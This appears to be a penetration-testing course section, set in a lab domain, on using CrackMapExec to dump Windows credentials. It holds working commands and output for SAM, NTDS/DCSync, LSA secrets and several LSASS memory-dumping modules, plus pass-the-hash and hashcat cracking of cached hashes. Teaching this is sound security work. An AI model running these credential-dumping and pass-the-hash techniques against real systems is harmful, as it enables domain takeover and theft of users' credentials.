# Finding Secrets and Using Them

When it comes to password extraction, CrackMapExec is very powerful. Imagine if we compromised ten workstations, and we want to dump the memory of the LSASS process to retrieve credentials from all of them; CrackMapExec can do it.

In this section, we will explore the methods CrackMapExec comes equipped with to dump Windows credentials.

***

## SAM

The SAM database contains credentials for all local users, and it is crucial to get them since many administrators reuse their local credentials on multiple machines. Using the option `--sam`, available with the `SMB` and `WinRM` protocols, we can quickly retrieve the contents of the SAM database.

### **Dumping SAM**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --sam

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Dumping SAM hashes
SMB         10.129.204.133  445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0660cf3453:::
SMB         10.129.204.133  445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.204.133  445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.129.204.133  445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
SMB         10.129.204.133  445    MS01             localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236ed3f3ac:::
SMB         10.129.204.133  445    MS01             sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f6:::
SMB         10.129.204.133  445    MS01             [+] Added 6 SAM hashes to the database
```

***

## NTDS Active Directory Database

Another location to obtain credentials from is the Active Directory database. The ntds.dit file is a database that stores Active Directory data, including information about user objects, groups, and group membership. Notably, the file also stores the password hashes for all users in the domain (and even sometimes stores cleartext passwords if [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) is enabled for one or more accounts). We can dump the hashes from a Domain Controller if we get access to a Domain Admin account or any other account with privileges to perform a replication/DCSync.

To dump the hashes, we need to use the option `--ntds`, in the following example, the user `robert` is not a Domain Admin, but it has privileges to perform replication.

{% hint style="info" %}
**Note:** The following exercises use proxychains. Refer to [Proxychains with CME ](https://academy.hackthebox.com/module/84/section/827)section for intrusion on how to set up proxychains.
{% endhint %}

### **Dumping the NTDS database from the Domain Controller**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         172.16.1.10     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.1.10     445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf361aa35efaf:::
SMB         172.16.1.10     445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         172.16.1.10     445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f238e:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         172.16.1.10     445    DC01             david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         172.16.1.10     445    DC01             john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a2:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7247e8d4387e76996ff3f18a34316fdd:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c08b424ec2d99589a9cce60:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821b547d09cf28b5864e54b:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821b547d09cf28b5864e54b:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831bddc88f6d7517615f3d45:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87df16aafa336fb6ffbbac59:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f851b949767163c35ae296:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca966c5c0b22eba3c8c4c5ae568b1:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2d0f48967ab753fba96b34:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c929084f0efd75791db7cb963d:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\harris:7104:aad3b435b51404eeaad3b435b51404ee:fb9e4fb946a15a0c68087bc830b5da12:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\soti:7105:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
SMB         172.16.1.10     445    DC01             DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d45:::
SMB         172.16.1.10     445    DC01             MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99c0:::
SMB         172.16.1.10     445    DC01             LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322dc502:::
SMB         172.16.1.10     445    DC01             [+] Dumped 23 NTDS hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190342.ntds of which 20 were added to the database
SMB         172.16.1.10     445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.1.10     445    DC01             [*] cat /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190342.ntds | grep -iv disabled | cut -d ':' -f1
```

When using the `--ntds` option, we can include the `--user` and `--enabled` options. We can specify the user we want to extract if we use `--user`. Let's dump the hash for the `KRBTGT` account.

### **Dumping only the KRBTGT Account**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u julio -p Password1 --ntds --user krbtgt

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
SMB         172.16.1.10     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.1.10     445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:742c416996dcf352efd5ac94200f238e:::
SMB         172.16.1.10     445    DC01             [+] Dumped 1 NTDS hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190444.ntds of which 1 were added to the database
SMB         172.16.1.10     445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.1.10     445    DC01             [*] cat /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-08_190444.ntds | grep -iv disabled | cut -d ':' -f1
```

If we specify `--enabled`, it will only show the users that are enabled on-screen and will present us with the option to extract the list of enabled users.

### **Showing Enabled Accounts Only**

```shell-session
$ proxychains4 -q crackmapexec smb 172.16.1.10 -u robert -p 'Inlanefreight01!' --ntds --enabled

SMB         172.16.1.10     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         172.16.1.10     445    DC01             [+] inlanefreight.htb\robert:Inlanefreight01! 
SMB         172.16.1.10     445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         172.16.1.10     445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         172.16.1.10     445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:ce590e9af90b47a6a2fdf361aa35efaf:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\julio:1106:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
SMB         172.16.1.10     445    DC01             david:1107:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         172.16.1.10     445    DC01             john:1108:aad3b435b51404eeaad3b435b51404ee:c4b0e1b10c7ce2c4723b4e2407ef81a2:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\svc_workstations:1109:aad3b435b51404eeaad3b435b51404ee:7247e8d4387e76996ff3f18a34316fdd:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\carlos:2606:aad3b435b51404eeaad3b435b51404ee:a738f92b3c08b424ec2d99589a9cce60:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\robert:2607:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821b547d09cf28b5864e54b:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\grace:5603:aad3b435b51404eeaad3b435b51404ee:a5c7f8ecc821b547d09cf28b5864e54b:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\peter:5604:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\alina:5605:aad3b435b51404eeaad3b435b51404ee:a5be3c11831bddc88f6d7517615f3d45:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\noemi:6104:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\engels:6105:aad3b435b51404eeaad3b435b51404ee:54f45c2b87df16aafa336fb6ffbbac59:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\kiosko:6107:aad3b435b51404eeaad3b435b51404ee:f399c1b9e7f851b949767163c35ae296:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\testaccount:6108:aad3b435b51404eeaad3b435b51404ee:e02ca966c5c0b22eba3c8c4c5ae568b1:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\mathew:6109:aad3b435b51404eeaad3b435b51404ee:abfcb587cd2d0f48967ab753fba96b34:::
SMB         172.16.1.10     445    DC01             inlanefreight.htb\svc_ca:6603:aad3b435b51404eeaad3b435b51404ee:828b21c929084f0efd75791db7cb963d:::
SMB         172.16.1.10     445    DC01             DC01$:1002:aad3b435b51404eeaad3b435b51404ee:f0ec1102494ee338521fb866f5848d45:::
SMB         172.16.1.10     445    DC01             MS01$:2107:aad3b435b51404eeaad3b435b51404ee:bcbea16a525492f90a27c14217da99c0:::
SMB         172.16.1.10     445    DC01             LINUX01$:2609:aad3b435b51404eeaad3b435b51404ee:0dcd992b30914be730714233322dc502:::
SMB         172.16.1.10     445    DC01             [+] Dumped 21 NTDS hashes to /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-05_162819.ntds of which 18 were added to the database
SMB         172.16.1.10     445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
SMB         172.16.1.10     445    DC01             [*] cat /home/plaintext/.cme/logs/DC01_172.16.1.10_2022-12-05_162819.ntds | grep -iv disabled | cut -d ':' -f1
```

***

## Using the Secrets (hashes)

The passwords we get are NTLM hashes. We can attempt to crack the hashes or use the Pass the Hash technique to authenticate as the user without cracking the password. See the [Pass the Hash (PtH)](https://academy.hackthebox.com/module/147/section/1638) section in the `Password Attacks` module to learn more about this attack technique.

CrackMapExec has the option `-H`, which expects an NTLM hash as an authentication method instead of a password:

### **Using NTLM Hashes**

```shell-session
$ crackmapexec winrm 10.129.204.133 -u administrator -H 30b3783ce2abf1af70f77d0660cf3453 --local-auth -x whoami

SMB         10.129.204.133  5985   MS01             [*] Windows 10.0 Build 17763 (name:MS01) (domain:MS01)
HTTP        10.129.204.133  5985   MS01             [*] http://10.129.204.133:5985/wsman
WINRM       10.129.204.133  5985   MS01             [+] MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
WINRM       10.129.204.133  5985   MS01             [+] Executed command
WINRM       10.129.204.133  5985   MS01             ms01\administrator
```

NTLM authentication is supported for the SMB, WinRM , RDP, LDAP, and MSSQL protocols

***

## LSA Secrets/Cached Credentials

CrackMapExec comes with an option `--lsa`, which is ported from `impacket-secretsdump`, which performs various techniques to dump hashes from the remote machine without executing any agent. It dumps the `LSA Secrets` including the `Cached credentials`, the local machine key list, the [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys, and service credentials.

`LSA Secrets` is a unique protected storage for critical data used by the Local Security Authority (LSA) in Windows. LSA is designed to manage a system's local security policy, audit, authenticate, log users onto the system, store private data, etc. Users' and systems' sensitive data is stored in secrets. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) keys are used to encrypt the data.

`Cached Credentials` are the credentials (cached domain records) stored inside the LSA when a user logs into a workstation or server.

### **Inspect LSA**

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' --lsa

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
SMB         10.129.204.133  445    MS01             [+] Dumping LSA secrets
SMB         10.129.204.133  445    MS01             INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
SMB         10.129.204.133  445    MS01             INLANEFREIGHT.HTB/david:$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
SMB         10.129.204.133  445    MS01             INLANEFREIGHT.HTB/john:$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:86e98ff8d71ffea8888277605546ff2b8475cc112d81b2a9c3000bb993fa630f
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:350bd90fcadae4e9d7e7dca40f82d316
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:ba234ae034f14c67
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:2f671b061503c93e6b673[SNIP]
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:7a09b4655244f2a10ceecf16e7fcdc03:::
SMB         10.129.204.133  445    MS01             dpapi_machinekey:0x78f7020d08fa61b3b77b24130b1ecd58f53dd338
dpapi_userkey:0x4c0d8465c338406d54a1ae09a56223e867907f39
SMB         10.129.204.133  445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\julio:Password1
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\david:Password2
SMB         10.129.204.133  445    MS01             INLANEFREIGHT\john:Password3
SMB         10.129.204.133  445    MS01             [+] Dumped 13 LSA secrets to /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.secrets and /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached
```

The hash format that starts with `$DCC2$` are the Domain Cached Credentials 2 (DCC2), MS Cache 2. Those hashes can be cracked using Hashcat, provided a weak password is set because this algorithm is much stronger than NTLM. Also, Domain Cached Credential hashes cannot be used for a Pass the Hash attack. To crack them, we need to remove the domain and username, grab the value after `$DCC2$`, and use Hashcat module 2100.

### **Cracking Hashes**

```shell-session
$ cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
$DCC2$10240#david#a8338587a1c6ee53624372572e39b93f
$DCC2$10240#john#fbdeac2c1d121818f75796cedd0caf0a
```

```shell-session
$ hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3:Password1

<SNIP>
```

***

## Gettings Secrets from LSASS

The memory of the LSASS process contains Windows passwords as cleartext or other formats of hashes such as NTLM or AES256/AES128. Dumping the memory can be an effective way to find more and more accounts until we find one domain administrator.

CrackMapExec contains several modules to dump the content of the LSASS process memory. Let's see some of them:

### **Lsassy Module**

1. [Lsassy](https://github.com/Hackndo/lsassy) Python tool to remotely extract credentials on a set of hosts. This [blog post](https://en.hackndo.com/remote-lsass-dump-passwords/) explains how it works. This tool uses the [Impacket](https://github.com/SecureAuthCorp/impacket) project to remotely read necessary bytes in an LSASS dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M lsassy

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
LSASSY      10.129.204.133  445    MS01             INLANEFREIGHT\julio 64f12cddaa88057e06a81b54e73b949b
LSASSY      10.129.204.133  445    MS01             INLANEFREIGHT\david c39f2beb3d2ec06a62cb887fb391dee0
LSASSY      10.129.204.133  445    MS01             INLANEFREIGHT\john c4b0e1b10c7ce2c4723b4e2407ef81a2
```

### **Procdump Module**

2. [Procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump) use Microsoft Procdump from Sysinternals to create an LSASS process dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M procdump

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
PROCDUMP    10.129.204.133  445    MS01             [*] Copy /tmp/procdump.exe to C:\Windows\Temp\
PROCDUMP    10.129.204.133  445    MS01             [+] Created file procdump.exe on the \\C$\Windows\Temp\
PROCDUMP    10.129.204.133  445    MS01             [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
PROCDUMP    10.129.204.133  445    MS01             [*] Executing command C:\Windows\Temp\procdump.exe -accepteula -ma 632 C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.dmp
PROCDUMP    10.129.204.133  445    MS01             [+] Process lsass.exe was successfully dumped
PROCDUMP    10.129.204.133  445    MS01             [*] Copy MS01-AMD64-INLANEFREIGHT.dmp to host
PROCDUMP    10.129.204.133  445    MS01             [+] Dumpfile of lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.dmp
PROCDUMP    10.129.204.133  445    MS01             [+] Deleted procdump file on the C$ share
PROCDUMP    10.129.204.133  445    MS01             [+] Deleted lsass.dmp file on the C$ share
PROCDUMP    10.129.204.133  445    MS01             INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
PROCDUMP    10.129.204.133  445    MS01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
PROCDUMP    10.129.204.133  445    MS01             INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2
```

### HandleKatz Module

3. [HandleKatz](https://github.com/codewhitesec/HandleKatz) this tool demonstrates the usage of cloned handles to LSASS to create an obfuscated memory dump of the same.

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M handlekatz

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
HANDLEKA... 10.129.204.133  445    MS01             [*] Copy /tmp/handlekatz.exe to C:\Windows\Temp\
HANDLEKA... 10.129.204.133  445    MS01             [+] Created file handlekatz.exe on the \\C$\Windows\Temp\
HANDLEKA... 10.129.204.133  445    MS01             [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
HANDLEKA... 10.129.204.133  445    MS01             [*] Executing command C:\Windows\Temp\handlekatz.exe --pid:632 --outfile:C:\Windows\Temp\%COMPUTERNAME%-%PROCESSOR_ARCHITECTURE%-%USERDOMAIN%.log
HANDLEKA... 10.129.204.133  445    MS01             [+] Process lsass.exe was successfully dumped
HANDLEKA... 10.129.204.133  445    MS01             [*] Copy MS01-AMD64-INLANEFREIGHT.log to host
HANDLEKA... 10.129.204.133  445    MS01             [+] Dumpfile of lsass.exe was transferred to /tmp/MS01-AMD64-INLANEFREIGHT.log
HANDLEKA... 10.129.204.133  445    MS01             [+] Deleted handlekatz file on the C$ share
HANDLEKA... 10.129.204.133  445    MS01             [+] Deleted lsass.dmp file on the C$ share
HANDLEKA... 10.129.204.133  445    MS01             [*] Deobfuscating, this might take a while
HANDLEKA... 10.129.204.133  445    MS01             INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
HANDLEKA... 10.129.204.133  445    MS01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
HANDLEKA... 10.129.204.133  445    MS01             INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2
```

### **Nanodump Module**

4. [Nanodump](https://github.com/helpsystems/nanodump) is a flexible tool that creates a minidump of the LSASS process. As opening a handle to LSASS can be detected, Nanodump can search for existing handles to LSASS. If one is found, it will copy it and use it to create the minidump. Note that it is not guaranteed to find such a handle.

```shell-session
$ crackmapexec smb 10.129.204.133 -u robert -p 'Inlanefreight01!' -M nanodump

SMB         10.129.204.133  445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False) (SMBv1:False)
SMB         10.129.204.133  445    MS01             [+] inlanefreight.htb\robert:Inlanefreight01! (Pwn3d!)
NANODUMP    10.129.204.133  445    MS01             [*] 64-bit Windows detected.
NANODUMP    10.129.204.133  445    MS01             [+] Created file nano.exe on the \\C$\Windows\Temp\
NANODUMP    10.129.204.133  445    MS01             [*] Getting lsass PID tasklist /v /fo csv | findstr /i "lsass"
NANODUMP    10.129.204.133  445    MS01             [*] Executing command C:\Windows\Temp\nano.exe --pid 632 --write C:\Windows\Temp\20221108_1148.log
NANODUMP    10.129.204.133  445    MS01             [+] Process lsass.exe was successfully dumped
NANODUMP    10.129.204.133  445    MS01             [*] Copying 20221108_1148.log to host
NANODUMP    10.129.204.133  445    MS01             [+] Dumpfile of lsass.exe was transferred to /tmp/cme/MS01_64_inlanefreight.htb.log
NANODUMP    10.129.204.133  445    MS01             [+] Deleted nano file on the C$ share
NANODUMP    10.129.204.133  445    MS01             [+] Deleted lsass.dmp file on the C$ share
NANODUMP    10.129.204.133  445    MS01             INLANEFREIGHT\david:c39f2beb3d2ec06a62cb887fb391dee0
NANODUMP    10.129.204.133  445    MS01             INLANEFREIGHT\julio:64f12cddaa88057e06a81b54e73b949b
NANODUMP    10.129.204.133  445    MS01             INLANEFREIGHT\john:c4b0e1b10c7ce2c4723b4e2407ef81a2
```
